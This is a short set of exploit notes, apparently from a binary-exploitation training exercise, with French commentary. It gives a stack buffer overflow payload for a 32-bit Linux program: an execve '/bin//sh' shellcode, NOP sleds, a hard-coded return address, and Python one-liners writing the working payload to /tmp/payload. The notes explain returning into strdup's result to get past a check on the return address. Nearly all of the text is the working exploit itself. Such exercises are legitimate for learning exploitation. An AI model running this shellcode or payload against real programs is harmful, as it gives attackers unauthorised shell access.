EIP = 80
=================================
addr debut buffer = 0xbffff5dc
=================================
shellcode = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
=================================
python :
python -c 'print("\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x90" * 42 + "\x90" * 4 + "\x3f\x85\x04\x08")'
=================================

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


===============================================================================

payload ok :

python -c 'print("\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x90" * 36 + "\x08\xa0\x04\x08")' > /tmp/payload

Le but ici c'est d'ecraser EBP par le retour de strdup. On ne peut pas ecraser
EIP par le debut du buffer parce qu'il y a un and qui protege.

il faut donc remplire le buffer avec un shellcode et a la fin de la fonction,
le programme ne va pas retourner dans le main, mais au retour de strdup.

le shellcode va alors s'executer.

